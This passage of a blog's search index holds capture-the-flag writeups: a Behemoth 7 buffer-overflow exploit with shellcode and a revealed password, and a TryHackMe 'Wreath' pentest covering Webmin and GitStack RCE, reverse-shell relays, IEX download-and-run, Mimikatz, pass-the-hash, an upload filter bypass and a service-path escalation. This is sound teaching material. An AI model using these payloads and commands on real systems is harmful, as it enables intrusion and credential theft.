x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80Program received signal SIGSEGV  Segmentation fault 0x42424242 inNote that the EIP register was successfully controlled to be 0x42424242  equivalent to BBBBThe beginning of the shellcode can be found withhin the stack pointergdb  x 100x  esp 200                                                                                                                                                       0xffffd228      0x41414141      0x41414141      0x41414141      0x414141410xffffd238      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd248      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd258      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd268      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd278      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd288      0x41414141      0x41414141      0x41414141      0x414141410xffffd298      0x41414141      0x41414141      0x41414141      0x414141410xffffd2a8      0x41414141      0x41414141      0x41414141      0x414141410xffffd2b8      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd2c8      0x41414141      0x41414141      0x41414141      0x414141410xffffd2d8      0x41414141      0x41414141      0x41414141      0x414141410xffffd2e8      0x41414141      0x42424242      0x41414141      0x41414141                                                                                                   0xffffd2f8      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd308      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd318      0x41414141      0x41414141      0x41414141      0x414141410xffffd328      0x41414141      0x41414141      0x41414141      0x414141410xffffd338      0x41414141      0x41414141      0x41414141      0x414141410xffffd348      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd358      0x41414141      0x41414141      0x99580b6a      0x2d6866520xffffd368      0x52e18970      0x2f68686a      0x68736162      0x6e69622f0xffffd378      0x5152e389      0xcde18953      0x00000080      0xffffd4df0xffffd388      0xffffd4f3      0x00000000      0xffffd799      0xffffd7ac0xffffd398      0xffffdd68      0xffffdd83      0xffffddb8      0xffffddcd0xffffd3a8      0xffffdde5      0xffffde01      0xffffde10      0xffffde21   endhighlightThe junk after the EIP begins at 0xffffd2e8   8 which is 0xffffd2f0  Following the junk bytes is the shellcode at 0xffffd358   8 which is equivalent to 0xffffd360  Therefore the EIP value should be overwritten to point to f 0xffffd360 Final PayloadWith the knowledge of the EIP offset and the shellcode address  the final payload can now be constructedhighlight bash  A  528    x48xd3xffxff     A  112    x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80    endhighlightIt is important to note that the repetition of  A  112 times was chosen so as to not spill 0x41 into the shellcode portion of memory  This value of 112 is not necessary  but it should be a multiple of 4 to prevent spilling into memory addresses that only shellcode should occupyThe payload works in GDB as can be seen from  bin bash being executedhighlight bash  gdb  r   python  c  print  A  528  x60xd3xffxff   A  112  x6ax0bx58x99x52x66                                                                                      x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x5                                                                                      1x53x89xe1xcdx80                                                                                                                                                       The program being debugged has been started already                                                                                                                         Start it from the beginning   y or n  y                                                                                                                                      Starting program   behemoth behemoth7   python  c  print  A  528  x60xd3xffxff   A  112  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80                     process 27236 is executing new program   bin bash                                                                                                                            behemoth7 behemoth  behemoth                                                       Program received signal SIGINT  Interrupt                                                                                                                                   0x00007ffff76ed441 in   pselect  nfds 1  readfds 0x7fffffffdac0  writefds 0x0                                                                                                  exceptfds 0x0  timeout  optimized out   sigmask 0x7fffffffda40                                                                                                              at    sysdeps unix sysv linux pselect c 69                                                                                                                              69         sysdeps unix sysv linux pselect c  No such file or directory                                                                                                      endhighlightWhen trying this payload outside of GDB  a shell is successfully popped  and the final local user is compromisedhighlight bash behemoth7 behemoth  behemoth  behemoth behemoth7   python  c  print  A  528  x60xd                                                                                      3xffxff   A  112  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx6                                                                                      2x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80                                                                                                                                                                                                                                 bash 4 4  whoami                                                                      behemoth8                                  bash 4 4  cat  etc behemoth pass behemoth8                                                                                                                                   pheewij7Ae   endhighlightConclusionEvery binary tested was successfully exploited  Many binaries which in practice should not be vulnerable  turned out to be exploitable due to the calling of sensitive system commands  in particular  bin sh   This resulted in the horizontal privilege escalation in  Behemoth 0   h y1go15cthbxu  and  Behemoth 6   h 1iiwc3vpzmajThere were multiple different vulnerabilities associated with each binary  running from format string exploits to buffer overflows and privilege escalation via the PATH environment variable The following remediations should strongly be consideredPerform boundary checks on user inputMultiple binaries were vulnerable due to the lack of boundary checksShellcode injection was possible on many binaries due to this lack of validationBad shellcode filtering can be bypassed if EIP can be overwritten as can be seen in  Behemoth 7   h tqwpdz749mlq Filter user inputMalicious shellcode could easily be injected in multiple binaries due to the lack of user input validation  although shellcode could be encoded  this would nevertheless mitigate these kind of attacks Never run sensitive system commands unless absolutely necessarySystem commands such as  bin sh should rarely ever be called  especially within a SETUID binary  due to its insecurityBinaries that should not have been vulnerable turned out to be exploitable due to calling  bin shAlways use the full path of a commandPATH environment variable attacks were present on  Behemoth 2   h 9e7hwp9wx39h Never read files that can be created by an untrusted userSymbolic links can be used to exploit this vulnerability as can be seen in  Behemoth 2   h 9e7hwp9wx39h  and  Behemoth 4   h eoybw49l4xbw 1    ftnt ref1   https   en wikipedia org wiki Debug symbol  https   www google com url q https   en wikipedia org wiki Debug symbol sa D source editors ust 1653865765817948 usg AOvVaw10 Sbvx5uab4E9BRbP7EzI2    ftnt ref2   http   shell storm org shellcode files shellcode 827 php  https   www google com url q http   shell storm org shellcode files shellcode 827 php sa D source editors ust 1653865765818443 usg AOvVaw2V79n8 mQbcRFN6UJyxSG63    ftnt ref3   https   cs155 stanford edu papers formatstring 1 2 pdf  https   www google com url q https   cs155 stanford edu papers formatstring 1 2 pdf sa D source editors ust 1653865765818868 usg AOvVaw1B21ux YEaTFgNKTQSEZ0e4    ftnt ref4   https   en wikipedia org wiki Printf format string  https   www google com url q https   en wikipedia org wiki Printf format string sa D source editors ust 1653865765819291 usg AOvVaw0ijy6fx6uwCLKlvsRn0pWq5    ftnt ref5   http   shell storm org shellcode files shellcode 827 php  https   www google com url q http   shell storm org shellcode files shellcode 827 php sa D source editors ust 1653865765819708 usg AOvVaw2tFX798AvE8fmXDLd HCbd6    ftnt ref6   http   shell storm org shellcode files shellcode 606 php  https   www google com url q http   shell storm org shellcode files shellcode 606 php sa D source editors ust 1653865765820159 usg AOvVaw0C45KTrdPmD1bAlZ13xzSz7    ftnt ref7    https   www geeksforgeeks org udp server client implementation c   https   www google com url q https   www geeksforgeeks org udp server client implementation c  sa D source editors ust 1653865765820615 usg AOvVaw1qYOIKa6LgcMl68faUKxdZ8    ftnt ref8   https   github com tmux tmux  https   www google com url q https   github com tmux tmux sa D source editors ust 1653865765821020 usg AOvVaw2SkIhzeH4xVPVNIjsbUS3a9    ftnt ref9   https   stackoverflow com questions 15593214 linux shellcode hello world  https   www google com url q https   stackoverflow com questions 15593214 linux shellcode hello world sa D source editors ust 1653865765821457 usg AOvVaw2s4pCASzpVuDQOGeobC9VM10    ftnt ref10   https   nets ec Ascii shellcode  https   www google com url q https   nets ec Ascii shellcode sa D source editors ust 1653865765821871 usg AOvVaw0Hs4moeXutsZw5ljokRKI11    ftnt ref11   https   www tutorialspoint com cprogramming c command line arguments htm  https   www google com url q https   www tutorialspoint com cprogramming c command line arguments htm sa D source editors ust 1653865765822316 usg AOvVaw0uaULKSyjHk8ZqJRg0dX8t12    ftnt ref12   https   en wikipedia org wiki Alphanumeric shellcode  https   www google com url q https   en wikipedia org wiki Alphanumeric shellcode sa D source editors ust 1653865765822735 usg AOvVaw1 5xEQIasreKL2WrOrhZfg13    ftnt ref13   http   shell storm org shellcode files shellcode 606 php  https   www google com url q http   shell storm org shellcode files shellcode 606 php sa D source editors ust 1653865765823147 usg AOvVaw1bzymHynnNSiyEF0TQSN4h",
      "image": "/images/behemoth.png"
    } ,
  
    {
      "title"    : "Wreath Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/03/30/Wreath-Writeup/",
      "date"     : "Mar 30, 2021",
      "content"  : "layout  posttitle   Wreath Writeupdescription  This challenge involved exploiting a vulnerable network of three computers  Two of which were susceptible to exploitations of outdated software  The last machine involved a unique foothold centered around the creation of a malicious image file  I highly encourage you to read this writeup  as I go into detail about how Mimikatz  evil winrm  and network pivoting work date    2021 03 30 image     images 0xd4y logo gray png category  tryhackme tags     RCE  Network Pivoting  CVE  Windows  LinuxThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Wreath 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedWreath NetworkA look into the exploitation of a vulnerable network and  secure  PC    images 0xd4y logo gray png 0xd4y3 30 20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653838005014409 usg AOvVaw25an5vkNB0TMwYaj42Rb zEmail   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653838005015197 usg AOvVaw0pgz6wlNqT0zFVbmvWRxvITable of ContentsExecutive Summary   h omwkq2eecx6j          2   h omwkq2eecx6jAttack Narrative   h kvwv83c9x680          3   h kvwv83c9x680First Machine   200    h 55makcv3sid9          3   h 55makcv3sid9Reconnaissance   h 15brehgu2heh          3   h 15brehgu2hehRCE Exploitation   h d8eov7lrs3zk          5   h d8eov7lrs3zkReverse Shell   h 1ksbyqawn0yj          6   h 1ksbyqawn0yjPersistence   h 5ddj5nrdegir          6   h 5ddj5nrdegirSecond Machine   150    h dcefpauwop9v          7   h dcefpauwop9vHost Enumeration   h 1k055na5o1w          7   h 1k055na5o1wPort Enumeration   h eyuja3ce9gk7          8   h eyuja3ce9gk7Port Forwarding   h k2f22ypbjcmx          8   h k2f22ypbjcmxRCE Exploitation   h qh5mgzdky661          9   h qh5mgzdky661Exploit Analysis   h eo2c10rr7b1l          10   h eo2c10rr7b1lReverse Shell   h knb7aexki2nv          11   h knb7aexki2nvPivoting through  200   h axirjpkdu9n4          11   h axirjpkdu9n4Socat Relay Reverse Shell   h 594oyljbb3l          12   h 594oyljbb3lAttempting to Use Mimikatz   h 97vcit39qga2          14   h 97vcit39qga2Shell Stabilization   h s0te4qb4wj7s          15   h s0te4qb4wj7sMimikatz   h wzvkxqwdhgz4          16   h wzvkxqwdhgz4How Mimikatz Works   h 1e0d2cf2l81w          17   h 1e0d2cf2l81wHow a Pass the Hash Attack  PtH  Works   h 8gvjg5icy5vq          17   h 8gvjg5icy5vqThird Machine   100    h s3o7v62f4w9x          18   h s3o7v62f4w9xPort Enumeration   h 9v37capbt8vh          18   h 9v37capbt8vhForward SOCKS Proxy   h rawsub1p8kzq          19   h rawsub1p8kzqExamining the Web Server   h u8r3yk24cxai          20   h u8r3yk24cxaiAnalysing the Website s Code   h 95p9eivup4ma          20   h 95p9eivup4maReverse Shell   h vg0sz8mjbd24          23   h vg0sz8mjbd24Privilege Escalation to System   h 6pr2bnv2a7sq          24   h 6pr2bnv2a7sqSearching for Misconfigurations   h cl07y2tty6ln          24   h cl07y2tty6lnUnquoted Service Path Attack   h 620okmtojvdb          25   h 620okmtojvdbHow an Unquoted Service Path Attack Works   h akupm4bz6btj          25   h akupm4bz6btjCreating a Malicious Binary   h qosauuxwt7yv          25   h qosauuxwt7yvData Exfiltration   h 9fxlslg9cn9k          28   h 9fxlslg9cn9kCleanup   h az3rsnxxjyhg          29   h az3rsnxxjyhgConclusion   h yctyzetjy9no          30   h yctyzetjy9noExecutive SummaryI was tasked with finding vulnerabilities in a client s network  Thomas Wreath   1    ftnt1   The attacks conducted in this report were not carried out in a black box penetration testing environment  rather the client informed us that he had a git server hosted on one of the machines in his network from which he hosts his website  Furthermore  I was told that there are three computers in the client s network  one of which the client assumed I could not penetrate as it had antivirus software installedThough the client was cautious about downloading potentially dangerous software on any of his systems  he did not update software on two out of three computers  allowing me to gain immediate root access on two thirds of the network  The third machine ran insecure code on a web page which could be exploited through uploading a malicious image fileAttack NarrativeFirst Machine   200We are given the ip of one of the systems on the network  This is the only machine in the network that can be immediately accessed  and thus it will be the first targetReconnaissanceAs with all penetration tests  I started by enumerating the ports of the target  This is an important step  as it is useful in identifying possible attack vectors  The services and versions of our target can be enumerated using the nmap tool and giving it the flags  sC and  sV  The  sC flag runs nmap s default scripts  while the  sV flag detects the versions of the scanned services  Note that knowing the version of a service is essential in determining the likelihood of it being vulnerable  old versions tend to have more known vulnerabilities  as they have been exposed to the warzone of the internet for a longer period of time   We can enumerate all open ports with the  p  flag and output all formats with the  oA flag reports Wreath image28 png We see that there are only four ports open  From the nmap scan  observe that the target machine is running an HTTP and HTTPS server on ports 80 and 443 respectively  It s important to notice that it is running Apache httpd 2 4 37 which belongs to the CentOS Linux distribution  Therefore  it s very likely that the target is running CentOS reports Wreath image43 png Using the curl tool to send a GET request to the server  we see that it is trying to redirect us to https   thomaswreath thm  However  the DNS of the target is not set up  as can be observed from the domain not being able to route us to the requested website reports Wreath image38 png Currently  this domain is not recognized by any of our VirtualHost  2    ftnt2  definitions  However  adding thomaswreath thm to the  etc hosts file  the file in Linux which is responsible for mapping hostnames to IP addresses   and running the same curl command again produces a different output reports Wreath image5 png  reports Wreath image21 png We can add the  k flag to specify that we don t care to verify the server s certificate  note this is insecure but it is fine in the context of this test reports Wreath image65 png And now we get what looks to be a webpage  Browsing to this domain through Firefox  we reach yet another warning reports Wreath image7 png One thing that s important to do before proceeding to the website is to check the server certificate  The certificate could give information about more domains that the web server may have  as well as some other useful information like names  locations  and email addresses  This can be checked by clicking on the  Advanced   box  and then clicking on the  View Certificate  link  I didn t see anything too interesting  but there is one email address reports Wreath image45 png I now proceeded to the website and was met with the following page reports Wreath image39 png RCE ExploitationNothing out of the ordinary was found while browsing through this website  However  going back to the result of the nmap scan and looking at the software version of the Webmin interface  it turned out that this service was outdated  Searching this service on Google revealed that there is a CVE  Common Vulnerabilities and Exposures  for it  Namely  this vulnerability is categorised as CVE 2019 15107  3    ftnt3  and ranked as a 9 8 critical vulnerability  Exploiting this vulnerability allows unauthorized remote code execution  RCE  due to a backdoor in the password resetting function Reverse ShellSeeing as this is a well known vulnerability  Metasploit already had a script to exploit this version of Webmin reports Wreath image49 png After setting the LHOST and RHOST  I ran the exploit and got a shell reports Wreath image47 png The web server was running as root  It is better practice to run a web service as a low privileged user such as www data just in case the web server gets compromised PersistenceAs root  the highest privileged Linux user  we can extract the hash of users on the system and try to crack it  It s possible that this same password is used in some other machine on the network reports Wreath image58 png Providing the   example hashes flag in hashcat  a tool for cracking hashes  and grepping for unix  we can see that the mode for the  etc shadow hashes is 1800  note that the hash corresponding to mode 1800 looks most similar to the hashes in the  etc shadow file reports Wreath image27 png Alternatively  another way to determine the identity of a hash is by using tools such as hashid or hash identifier reports Wreath image37 png The password used for the root user is secure enough to not be cracked by the rockyou txt file  so I copied this hash to examine for later if neededAfter compromising the root user  I maintained persistence by going into  root  ssh id rsa and copying the contents of the id rsa file  this is a private key which is used to authenticate a client to a server reports Wreath image29 png Second Machine   150Host EnumerationWith full access on one of the three machines on the Wreath network  I enumerated the internal network to find any other systems by using nmap on the compromised system  a static binary of it can be downloaded on GitHub  4    ftnt4    To speed up the process  I added the  sn flag which disables port scans reports Wreath image33 png We see that there are a total of four other machines on the internal network  note we are 10 200 111 200   I was told by the client that the host ending in  1 is part of the AWS infrastructure used for creating the network  and the host ending in  250 is the OpenVPN server  As such  we will focus on the two hosts ending in  100 and  150 Port EnumerationAfter discovering these two hosts  I enumerated their ports reports Wreath image34 png Observe that all of the ports on the  100 machine are filtered  but the  150 computer has three ports open  80  3389  and 5985   It s important to note that it s likely this is a Windows machine due to ports 3389  typically reserved for RDP  and 5985  WRM   WinRM  being openPort ForwardingThe HTTP service on port 80 is a good one to forward because web servers have a big attack surface  I chose to forward this port to localhost on port 18020 using ssh reports Wreath image48 png Now when I visited localhost 18020  I was met with a web page reports Wreath image32 png Looking at the error on the webpage  we see that there are three directories1   registration login 2   gitstack 3   restThe  user subdirectory under  rest discloses information about the users on the GitStack software  but I was unable to find anything that looked alarming reports Wreath image44 png Visiting  gitstack redirected me to a login page on  registration login reports Wreath image50 png There is a nice handy message that says the default username and password is admin admin  but trying it out reveals that the credentials for this login page have since been changed  The source code of the page did not reveal anything eitherRCE ExploitationHowever  knowing that this machine is only available on the internal network  it is possible that its software is not updated  The outdated software of this website is especially alarming when looking at the output of nikto  a tool for scanning vulnerabilities on web servers reports Wreath image9 png Note the large amount of outdated softwareIt follows that the GitStack software used on the target might also be outdated and vulnerable  Searchsploit is a great tool for finding exploits for outdated software reports Wreath image16 png All three exploit results about GitStack are about the same version  namely 2 3 10   I then copied the exploit php webapps 43777 py onto my local machine Exploit AnalysisBefore running this exploit  we will examine it to see how it works reports Wreath image14 png As can be seen from the image above  the password field is most likely vulnerable  as it turns out  the username field is also vulnerable   The python script injects PHP code into the password field  and the web server executes it  This critical vulnerability was caused by passing unsanitized user input into an exec function  5    ftnt5 reports Wreath image15 png When running the script  it uploads a PHP web shell called exploit php with the parameter  a  to the  web directory  I modified the script and called it exploit 0xd4y php  as it is good practice to change the default configurations of an exploit whether that be a password to a backdoor  parameters  etc Reverse ShellI curled this web shell and provided it the  d flag to specify the data to be inputted reports Wreath image13 png And this web server is running as System  the highest privileged Windows user  even higher than Administrator   I then tried to find a way to get a reverse shell from the exploited system  The first thing to test is to see if our attack box can be pinged from the target  I made sure to use the  n flag to specify how many packets to send   It is extremely important to note this seemingly insignificant flag  If we were to not specify how many packets to send  the server would constantly be trying to ping us  and there would be no way for us to stop this command without somehow killing the process  A constant ping to our attack box would therefore look suspiciousPivoting through  200We can set up a tcpdump on the tun0 interface  the VPN routing path  and provide it with the icmp argument  Internet Control Message Protocol  so that we are only listening for pinging packets reports Wreath image40 png Alas  I did not receive a response from the server  This meant that we cannot send a direct reverse shell from  150 to us  However  we can use nishang  6    ftnt6  to get a socat reverse shell relay  CentOS  the operating system of the compromised  200 machine  has a very restrictive firewall called firewalld that will limit almost all inbound connections reports Wreath image46 png We can see that the firewall is activeUnfortunately  our attack box cannot  talk  with the  150 machine directly  but the host ending in  200 can  This means that we could get a reverse shell by setting up a listener on the  200 machine which forwards traffic to us  and then have the  150 host directly send the reverse shell to the  200 host Socat Relay Reverse ShellI used a socat reverse shell to demonstrate this  as it is instructive on how networking traffic can be directed1   We are going to set up a listening port on 20001 on the  200 machine and forward all traffic from that port to 20002 on our machine reports Wreath image35 png 2   Next  we will set up netcat listening on port 20002 on our system reports Wreath image66 png 3   I used the Invoke PowerShellTcp ps1 nishang script and added Invoke PowerShellTcp  Reverse  IPAddress 10 200 111 200  Port 20001 to the bottom of the script  so that when downloading the script using IEX  more on this later   each line in the script will be automatically executed giving us a reverse shell reports Wreath image20 png Note how we are sending the reverse shell to  200 on port 20001  remember all traffic on port 20001 will be directed to our port 20002 on our machine4   Now  the firewall will block inbound connections for any ports that are not specified as exceptions  We have to tell the firewall which ports it should allow for connections by using the firewall cmd command as such reports Wreath image41 png Alternatively you can type systemctl stop firewalld to completely disable the firewall  though this is one of the noisiest actions a pentester can do  and it should only be done when it is an absolute necessityRemember that port 20001 will be directing all traffic to us5   Port 20003 will be the HTTP server on  200 which we can set up with python3  m http server 20003  it will serve the powershell reverse shell file  which I renamed to 0xd4y rev ps16   Finally  it s time for the payload  We can download files   strings using IEX  Elixir s Interactive Shell  in powershell reports Wreath image70 png Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotesUnfortunately  this payload did not work  most likely due to some special characters   I am running commands through a web shell  and therefore it is likely that the server is not understanding some of the special characters in the payload  This means that most likely we will have to url encode the payload for it to work reports Wreath image64 png Sure enough  when I executed this command  the output hanged and I got a hit on the python HTTP server reports Wreath image77 png So now that 0xd4y rev ps1 was executed by the server  there should be a reverse shell getting sent to port 20001 on  200 which is getting forwarded to us on 20002 reports Wreath image17 png  Attempting to Use MimikatzNow  with a reverse shell as System  we have the necessary privileges to extract password hashes using Mimikatz  a tool used to gather credentials on a system  Before downloading Mimikatz onto the target  it s important to check if the target is a 32bit or 64bit computer by using the systeminfo command reports Wreath image53 png Noticing that this is a 64bit computer  I downloaded a 64bit mimikatz binary reports Wreath image25 png I downloaded this binary in the C WindowsSystem32spooldriverscolor directory out of habit  as this is a world writable path and is typically whitelisted by AppLocker  a program which restricts which files can be executed based on the file s pathAlas  running Mimikatz on an unstable shell simply does not work  I tried getting a meterpreter shell  but that did not work either  However  with ssh being open on  200  a powerful tool named sshuttle can be leveraged as a VPN into this internal network reports Wreath image12 png We can confirm this worked by trying to curl the web page reports Wreath image10 png Shell StabilizationEarlier  we found that port 3389 was open on the  150 system  This is the port typically designated for Remote Desktop Protocol  RDP   and we can use this port to get a nice GUI on the box  First  I created a user with admin privileges inside the Remote Management Users group so as to allow us to remotely authenticate as the user through RDP reports Wreath image11 png We can now use evil winrm with our created credentials to easily get a shell on the box reports Wreath image76 png  MimikatzWith the user that we created  a nice GUI instance can be established using the xfreerdp command as follows reports Wreath image31 png This results in a GUI instance of the box  I executed cmd exe as Administrator because the created user is part of the Administrators group  With administrative privileges  it s possible to extract Windows  stored credentials  I talk about this in depth in my Bastion Writeup  7    ftnt7 reports Wreath image52 png  reports Wreath image59 png  reports Wreath image1 png These NTLM Hashes were edited so as to not expose the full hash  How Mimikatz WorksLooking at the output of Mimikatz  we can see the hashes for all the users on the system  This is due to the single sign on  SSO  feature of Windows  The SSO feature is used so as to not constantly ask the user to input his username and password whenever he wants to access a resource on the network  as this is simply tedious  once again  the great old war between convenience and security   Instead  the server hashes the user s password and stores it in the SAM  Security Account Manager  hive  These credentials are then managed by the Local Security Authority  LSASS exe   essentially enabling SSOCopying the output of Mimikatz  I saw that Thomas has an insecure password which hashcat cracked  alternatively  you can use  https   crackstation net   https   www google com url q https   crackstation net   sa D source editors ust 1653838005042499 usg AOvVaw1faAwek1  0r6RfsC5v4ie   8    ftnt8    However  the Administrator password was too secure to crack  but it is still possible to use this hash for authenticating as the Administrator user  Evil winrm has an extremely powerful flag denoted with  H which is used to gain access to an account by performing a pass the hash attack  PtH reports Wreath image68 png   How a Pass the Hash Attack  PtH  WorksAs can be seen in the image above  we authenticated as Administrator despite not specifying the password for the user  confirming that PtH worked  This attack works as follows  9    ftnt9Pentester  Cool  I just got Administrator s hash so let s use evil winrm to access the powershell exe resource as Administrator   Hey server  Give me powershell exe as AdministratorServer   Hi there Pentester  I know you want powershell exe as the Administrator user  but I can t just give it to you without verifying first that you are in fact the Administrator  I ll test you by sending you this random 16 byte integer  65532345234   34324234  Encrypt this with your password hash and send the response back to mePentester  No problem  I ll encrypt this 16 byte number with Administrator s hash   Hey Server  Here is my encrypted response                   121  the actual encryption doesn t really look like this in reality  but I will use this string for the purpose of demonstrationServer   Alright  thanks for the response Pentester  Hi Domain Controller  I challenged Pentester with this 16 byte integer  65532345234   34324234  and this was his encrypted response                    121Domain Controller  Right  well I have Server s challenge and Pentester s response  Let me go check my library of NTLM hashes and see if I can decrypt this response with Administrator s hash   and I can  This must be Administrator then   Hello Server  I was able to decrypt the response with Administrator s hash  so this must be Administrator  Grant the client the powershell exe resourceServer   Sure thing  Here you go PentesterPentester   Thanks for the shellThird Machine   100Port EnumerationAfter establishing persistence on the  150 host  the third and final machine is yet to be compromised  the  100 computer   The first thing we should do is enumerate the ports of the machine  just like we did with all the other compromised systems  Instead of trying to manually upload a port scanning script onto the box  we can use evil winrm by utilizing the  s flag reports Wreath image22 png We see that ports 80 and 3389 are open  These most likely correspond to HTTP and RDP respectively  Unfortunately  we cannot access this computer through the  200 proxy because it is only visible by  150Forward SOCKS ProxyThis means that we will need to create a proxy on the  150 machine  A tool called chisel comes in handy for this operation  To set up a forward SOCKS proxy on the  150 machine  we first need to follow a couple of steps1   The server must be told to disable the firewall on the port we want to use for the forward proxy  I will use port 30001 reports Wreath image6 png 2   The server should then be told to listen on port 30001 for inbound connections reports Wreath image18 png 3   Next  on the attacking box we want to connect to the listening port  and forward all data to a proxy sitting on 30002 reports Wreath image71 png 4   We then configure the web browser extension FoxyProxy to connect to this proxy reports Wreath image8 png 5   Finally  we can visit the website sitting on  100 reports Wreath image73 png Examining the Web ServerAlong with FoxyProxy  Wappalyzer is also a very useful browser extension which displays useful information about how a website is built  Running this extension on Thomas s personal website  we see the following reports Wreath image36 png  Analysing the Website s CodeThis website looks identical to the one on the  200 host  Thomas told us that he is  serving a website that s pushed to my git server   The  150 machine has a git server and this is most likely what he was referring to  so I downloaded the source code of his website reports Wreath image75 png Using the extractor tool from GitTools  10    ftnt10   I iterated through the commits of the git repository  Unfortunately  this tool does not list the commits by date  but this can be done manually by looking at the parent of each commit reports Wreath image74 png We see that the commit starting with 70dd does not have a parent  so this must be the oldest commit  The parent of 82df is 70dd  and the parent of 345a is 82df  This means that from youngest to oldest the commits are as follows1   345a2   82df3   70ddWe can examine the code from the most recent commit  Seeing as Wappanalyzer identified Thomas s webpage as being run in PHP  it follows that there should likely be an index php file reports Wreath image54 png Taking a look at the file  there seems to be an upload feature that redirects uploaded files to a directory called uploads        reports Wreath image62 pngThe filter checks if a file is an image based on its size and if a file ends with a valid extension  We can see that the allowed extensions are jpg  jpeg  png  and gif  so I examined how the webpage identifies the extension reports Wreath image60 png The explode function splits a string into an array based on a specified parameter  In the code  it is set to split based on the period character and grabs the string at index one  note that this is the second element in the array  as the first element is at index zero   It then compares this string with one of the allowed extensions  The problem with this is that upon uploading a file called reverse shell jpg php  the code will split the file as followsreverse shell   jpg   phpThen  the string in the first index  jpg  will be compared  Thus  we have bypassed the first filter  The second filter  i e  the image size check  can also be bypassed  11    ftnt11   We can add a comment to an image with malicious php code  and if the server executes our image as php  then our malicious code will work as a web shell reports Wreath image56 png A basic HTTP authentication is required to access the  resources directory  but we cracked Thomas s hash  before   h wzvkxqwdhgz4   so it is likely that Thomas reused this password for authentication to his web server  We can guess that the username is Thomas  or other variations of his name  and we get into the upload page  it turns out that the username was indeed ThomasReverse Shell reports Wreath image3 png I then uploaded the malicious image file  0xd4y image jpg php reports Wreath image51 png Visiting the uploaded script on resources uploads 0xd4y image jpg php reveals that it got successfully uploaded  To test if the image successfully is getting executed as php  I gave the command of whoami to the parameter cmd reports Wreath image63 png And the php web shell works  The next step is to get a reverse shell  After identifying the target as a 64 bit machine by using systeminfo  I uploaded a 64bit netcat binary  12    ftnt12  and called it 0xd4y nc exe  I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl  To get a reverse shell  I used a simple nc reverse shell payload  powershell exe 20C xampphtdocsresourcesuploads0xd4y nc exe 2010 50 112 6 20443 20 e 20cmd exe reports Wreath image30 png Note how I used port 443 for the reverse shell  as this port tends to be treated as unsuspicious by AV  In contrast  using port 1337 or port 9001 seems very suspicious  but in this case it works anywaysPrivilege Escalation to System Searching for MisconfigurationsEnumerating the privileges of our compromised user  we don t see anything too out of the ordinary reports Wreath image72 png However  this user does have the SeImpersonatePrivilege which could potentially be vulnerable to exploits such as Juicy Potato  13    ftnt13   note that even though this is a 2019 Windows system rather than 2016  there have been some exploitations of this privilege in later versions  14    ftnt14I ignored this potential privilege escalation vector due to its greater complexity  and I enumerated the services for a potential vulnerability to an unquoted service path attack Unquoted Service Path AttackIt s likely that the default Windows paths will not be vulnerable to this sort of attack  so I focused on services that were not in C Windows reports Wreath image67 png As it turned out  there was a service that contained an unquoted path called SystemExplorerHelpService  How an Unquoted Service Path Attack WorksDue to there not being quotes around the path to this service  Windows does not know where to execute the desired binary  Seeing as the path for this vulnerable service is C Program Files  x86 System ExplorerSystem ExplorerserviceSystemExplorerService64 exe  Windows will check for a binary in the following order  15    ftnt151   C Program exe2   C Program Files  x86 System exe3   C Program Files  x86 System ExplorerSystem exe4   C Program Files  x86 System ExplorerSystem Explorerservice exe5   C Program Files  x86 System ExplorerSystem ExplorerserviceSystemExplorerService64 exeIt is highly unlikely that the compromised user has write access to C Program Files x86   but it is probable that the user can write to C Program Files x86 System Explorer  Therefore  we can create a malicious binary called System exe in the appropriate path  and it will get executed  Creating a Malicious BinaryChecking to see if this service is running as System revealed that it is reports Wreath image24 png This seemed like a good vector for privilege escalation  however  I understood that I would be lucky if the compromised user had permissions to edit this service reports Wreath image4 png Seeing as we are part of the BUILTINUsers group  we have FullControl to this service  The System Explorer executable can therefore be replaced by whatever we would like  I created a program in C  called malicious cs that returns a reverse shell reports Wreath image78 png Following the creation of the script  I compiled this program with mcs  a C  compiler reports Wreath image26 png After compiling the program  I renamed malicious exe to System exe  Seeing as System is running the service we are trying to hijack  it follows that we should get a reverse shell as System when restarting the service  After downloading the binary to the target  I copied it over to the C Program Files  x86 System Explorer directory reports Wreath image19 png With the malicious binary in place  I set up a netcat listener on port 443  as specified in the C  code  before restarting the service reports Wreath image57 png Typing sc stop SystemExplorerHelpService  to stop the service  and sc start SystemExplorerHelpService  to start the service  resulted in a reverse shell as System reports Wreath image2 png Data ExfiltrationNow  with a reverse shell as System  we can extract the stored credentials on this system  Mimikatz cannot be used as Antivirus is installed on this machine  However  because we are System  we can copy the SAM and SYSTEM files and locally extract the stored hashes  I set up an SMB server on my machine to download the files with sudo impacket smbserver share    smb2support  username 0xd4y  password pass and transferred the SAM and SYSTEM hives as follows reports Wreath image61 png  reports Wreath image55 png Note that we received the NTLMV2 hash of our created SMB user  Cracking this hash reveals that the password of 0xd4y is passOn the 